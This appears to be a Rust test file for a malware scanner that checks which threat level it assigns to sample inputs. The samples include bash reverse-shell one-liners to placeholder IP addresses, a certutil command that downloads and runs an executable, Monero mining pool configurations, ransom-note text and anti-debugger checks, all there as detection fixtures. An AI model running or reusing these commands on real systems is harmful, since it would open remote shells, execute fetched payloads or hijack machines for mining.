        b"import os, subprocess\nos.dup2(log.fileno(), 1)\nsubprocess.run([\"/bin/sh\", \"-c\", cmd])\n",
    );
    assert_eq!(level, ThreatLevel::Clean);
    assert!(classes.is_empty());
}

#[test]
fn notes_about_reverse_shells_beside_an_ordinary_dev_tcp_socket_stay_weak() {
    for text in [
        &b"# Bash networking\n\n    exec 3<>/dev/tcp/example.com/80\n    printf 'GET / HTTP/1.0\\r\\n\\r\\n' >&3\n    cat <&3\n\nThe same feature is how a reverse shell is written in pure bash.\n"[..],
        &b"#!/bin/bash\n# health check: it is not a bind shell\nexec 3<>/dev/tcp/127.0.0.1/8080\nprintf 'HEAD / HTTP/1.0\\r\\n\\r\\n' >&3\nread -r status <&3\n"[..],
    ] {
        let (level, classes, _) = level_of(text);
        assert_eq!(level, ThreatLevel::Clean, "{}", String::from_utf8_lossy(text));
        assert!(classes.is_empty());
    }
}

#[test]
fn documentation_about_reverse_shells_stays_weak_beside_shell_strings() {
    let (level, classes, _) = level_of(
        b"A reverse shell connects back to the operator. The shell started is /bin/sh.\nIt may call os.dup2( or pty.spawn( on the way.\n",
    );
    assert_eq!(level, ThreatLevel::Clean);
    assert!(classes.is_empty());
}

// ---- R8-T: source that calls an anti-debug technique.

#[test]
fn source_code_that_calls_an_anti_debug_technique_keeps_its_level() {
    // The six sources of test_programs call the technique; each is Suspicious.
    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("test_programs");
    for name in [
        "c_advanced.c",
        "go_test.go",
        "ada_test.adb",
        "fortran_test.f90",
        "nim_test.nim",
        "zig_test.zig",
    ] {
        let analysis = analyze_threats(&root.join(name)).unwrap();
        assert!(
            analysis.threat_level >= ThreatLevel::Suspicious,
            "{name}: {:?}",
            analysis.threat_level
        );
    }
    // Calls of the debugger-check APIs.
    let (level, _, _) = level_of(
        b"#include <windows.h>\nint main(void) {\n  BOOL b = FALSE;\n  if (IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), &b)) return 1;\n  return 0;\n}\n",
    );
    assert!(level >= ThreatLevel::Suspicious);
    // A real call after a closed comment is still a call.
    let (level, _, _) = level_of(
        b"#include <windows.h>\n#include <stdio.h>\n/* entry point */\nint main(void) {\n  BOOL b = FALSE;\n  if (IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), &b)) return 1;\n  puts(\"ok\");\n  return 0;\n}\n",
    );
    assert!(level >= ThreatLevel::Suspicious);
    // A read of the tracer's pid, with the VM names beside it.
    let (level, _, _) = level_of(
        b"package main\nimport \"os\"\nfunc d() bool {\n  data, _ := os.ReadFile(\"/proc/self/status\")\n  _ = data\n  return false\n}\nvar vm = []string{\"VirtualBox\", \"VMware\", \"QEMU\", \"TracerPid\"}\n",
    );
    assert!(level >= ThreatLevel::Suspicious);
}

#[test]
fn prose_that_only_names_the_anti_debug_calls_stays_weak() {
    // Backtick spans, a fenced example and a string literal are not calls.
    for text in [
        &b"# Notes\n\nCall `IsDebuggerPresent()` or `CheckRemoteDebuggerPresent(` to find a debugger.\n"[..],
        &b"# Notes\n\n```c\nif (IsDebuggerPresent() || CheckRemoteDebuggerPresent(h, &b)) exit(1);\n```\n"[..],
        &b"fn main() {\n    let names = \"IsDebuggerPresent( and CheckRemoteDebuggerPresent(\";\n    println!(\"{names}\");\n}\n"[..],
        &b"# Notes\n\nPrograms read TracerPid from \"/proc/self/status\" and check VMware, VirtualBox.\n"[..],
        // Plain prose: no heading, fence, backtick or quote.
        &b"Notes on debuggers\nuse IsDebuggerPresent() at start-up and exit when it returns true.\nThe second check is CheckRemoteDebuggerPresent() and it reports the same.\n"[..],
        // Names inside a C block comment are not calls.
        &b"#include <stdio.h>\n/* IsDebuggerPresent() and CheckRemoteDebuggerPresent() are not used; attach freely. */\nint main(void) { puts(\"hi\"); return 0; }\n"[..],
        &b"#include <stdio.h>\n/* IsDebuggerPresent() and\n   CheckRemoteDebuggerPresent();\n   are not used. */\nint main(void) { puts(\"hi\"); return 0; }\n"[..],
        // A closed header comment, then a closed comment that names the calls.
        &b"/* hello.c: prints a greeting. */\n/* IsDebuggerPresent() and CheckRemoteDebuggerPresent() are not called;\n   attach any debugger you like. */\n#include <stdio.h>\nint main(void) {\n  puts(\"hello\");\n  return 0;\n}\n"[..],
        &b"A Windows program typically calls IsDebuggerPresent() first and then CheckRemoteDebuggerPresent() to find a debugger. On Linux the usual trick is ptrace(PTRACE_TRACEME, 0, 0, 0) and reading TracerPid from /proc/self/status.\n"[..],
    ] {
        let (level, classes, rules) = level_of(text);
        assert!(rules.iter().any(|r| r == "anti_analysis"), "{text:?} {rules:?}");
        assert_eq!(level, ThreatLevel::Clean, "{}", String::from_utf8_lossy(text));
        assert!(classes.is_empty());
    }
}

#[test]
fn text_that_quotes_indicators_keeps_its_level() {
    // Text that quotes an indicator keeps its level (known limit: a document
    // that only quotes ransom or reverse-shell strings is still rated).
    let doc = b"# Detection notes\n\n```\nYour files have been encrypted.\nPay the ransom in Bitcoin.\n```\n";
    let (level, classes, _) = level_of(doc);
    assert_eq!(level, ThreatLevel::Critical);
    assert!(classes.contains(&ThreatClassification::Ransomware));

    // Source and scripts that embed and run their indicators in strings are
    // the real thing
    for hostile in [
        &b"var s=new ActiveXObject(\"WScript.Shell\");\ns.Run(\"cmd.exe /c certutil -urlcache -f http://192.0.2.1/p.exe p.exe && p.exe\",0);\n"[..],
        &b"#!/bin/bash\nfunction start {\n  nohup bash -c \"bash -i >& /dev/tcp/192.0.2.10/4444 0>&1\" &\n}\nstart\n"[..],
        &b"import os\nos.system(\"bash -i >& /dev/tcp/192.0.2.10/4444 0>&1\")\n"[..],
        // A fence line elsewhere in a file with no shebang does not make it a
        // document: the reverse shell in backticks or a template literal runs.
        &b"cat > README.md <<'EOF'\n```\nusage: tool\n```\nEOF\nr=`bash -i >& /dev/tcp/192.0.2.71/9001 0>&1 &`\n"[..],
        &b"// usage:\n// ```\n// node tool.js\n// ```\nconst { exec } = require('child_process');\nexec(`bash -i >& /dev/tcp/192.0.2.72/4444 0>&1`);\n"[..],
        // A `#` comment is not a heading and command substitution is not a
        // backtick span.
        &b"#!/bin/bash\n# nightly sync helper\nfor i in 1 2; do\n  r=`bash -i >& /dev/tcp/192.0.2.44/9001 0>&1`\ndone\n"[..],
    ] {
        let (level, classes, _) = level_of(hostile);
        assert!(level >= ThreatLevel::Suspicious, "{}", String::from_utf8_lossy(hostile));
        assert!(classes.contains(&ThreatClassification::Backdoor));
    }

    let (level, classes, _) = level_of(
        b"#!/bin/sh\n# perf tuning\nfor i in 1 2; do\n  PID=`./worker -o stratum+tcp://pool.example.invalid:3333 -u 44AFF0123456789abcdef --coin monero`\ndone\n",
    );
    assert!(level >= ThreatLevel::Suspicious);
    assert!(classes.contains(&ThreatClassification::Cryptominer));

    // The other side. A plain-text ransom note, in running text.
    let (level, classes, _) = level_of(
        b"Your files have been encrypted.\nTo decrypt your files pay the ransom in Bitcoin to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa.\nRenamed: .locked .encrypted\n",
    );
    assert_eq!(level, ThreatLevel::Critical);
    assert!(classes.contains(&ThreatClassification::Ransomware));
    // A shell script that runs a reverse shell.
    let (level, classes, _) = level_of(b"#!/bin/bash\nbash -i >& /dev/tcp/10.1.1.1/4444 0>&1\n");
    assert!(level >= ThreatLevel::Suspicious);
    assert!(classes.contains(&ThreatClassification::Backdoor));
    // A miner configuration file: JSON, and TOML, are all quoted strings.
    for config in [
        &b"{\n  \"coin\": \"monero\",\n  \"url\": \"stratum+tcp://pool.example.invalid:3333\",\n  \"hashrate\": true\n}\n"[..],
        &b"[pool]\nurl = \"stratum+tcp://pool.example.invalid:3333\"\ncoin = \"monero\"\n"[..],
    ] {
        let (level, classes, _) = level_of(config);
        assert!(level >= ThreatLevel::Suspicious, "{}", String::from_utf8_lossy(config));
        assert!(classes.contains(&ThreatClassification::Cryptominer));
    }
    // A program that names its pool and wallet in code: identifiers are
    // outside any quote.
    let (level, classes, _) = level_of(
        b"package main\nvar WalletAddr = \"1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\"\nvar PoolURL = \"stratum+tcp://pool.example.invalid:3333\"\nfunc startMining() {}\n",
    );
    assert!(level >= ThreatLevel::Suspicious);
    assert!(classes.contains(&ThreatClassification::Cryptominer));
    // A binary that holds the same words is never weak.
    let mut binary = vec![0u8, 1, 2, 0];
    binary.extend_from_slice(b"Your files have been encrypted. Pay the ransom in Bitcoin.");
    let (level, classes, _) = level_of(&binary);
    assert_eq!(level, ThreatLevel::Critical);
    assert!(classes.contains(&ThreatClassification::Ransomware));
}
